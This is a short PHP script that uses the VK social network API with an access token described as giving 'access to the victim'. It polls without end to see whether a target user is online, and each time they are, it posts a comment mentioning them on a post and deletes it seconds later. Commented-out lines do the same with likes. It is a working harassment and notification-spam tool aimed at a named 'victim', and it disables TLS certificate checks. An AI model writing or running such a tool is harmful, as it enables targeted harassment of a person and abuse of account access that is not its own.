<?php

$userid = ''; # target id (victim)
$accesstoken = ''; # for access to the victim
$postid = ''; # target post id
$message = '@id'.$userid; # victims mention
$useragent = 'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1';

function doCurlRequest($url){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
#  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
  curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  $data = curl_exec($ch);
  if(curl_errno($ch)) {
    echo 'curl error:'.curl_error($ch).PHP_EOL;
    $data = NULL;
  }
  curl_close($ch);
  return $data;
}

set_time_limit(0);

while (true) {
  $userinfo = doCurlRequest('https://api.vk.com/method/users.get?user_id='.$userid.'&fields=online&v=5.45&access_token='.$accesstoken); 
  if (!is_null($userinfo)) {
    $userinfo = json_decode($userinfo);
    if ($userinfo->response[0]->online > 0) {
      echo 'Victim ' . $userinfo->response[0]->first_name . ' is online' . PHP_EOL;
      # echo 'Like post with id = ' . $postid . PHP_EOL;
      # doCurlRequest('https://api.vk.com/method/likes.add?owner_id='.$userid.'&item_id='.$postid.'&type=post&v=5.50&access_token='.$accesstoken);
      # sleep(5);
      # doCurlRequest('https://api.vk.com/method/likes.delete?owner_id='.$userid.'&item_id='.$postid.'&type=post&v=5.50&access_token='.$accesstoken);  
      echo 'Add victim mention to post with id = ' . $postid . PHP_EOL; 
      $commentid = doCurlRequest('https://api.vk.com/method/wall.addComment?owner_id='.$userid.'&post_id='.$postid.'&text='.$message.'&v=5.50&access_token='.$accesstoken);
      $commentid = json_decode($commentid);
      $commentid = $commentid->response->comment_id;
      sleep(5);
      echo 'Remove mention. Comment id = ' . $commentid . PHP_EOL;
      doCurlRequest('https://api.vk.com/method/wall.deleteComment?owner_id='.$userid.'&comment_id='.$commentid.'&v=5.50&access_token='.$accesstoken);
    } else {
       echo 'Victim ' . $userinfo->response[0]->first_name . ' is offline' . PHP_EOL;
    }
    flush();
    ob_flush();
  }
  sleep(15);
}

?>
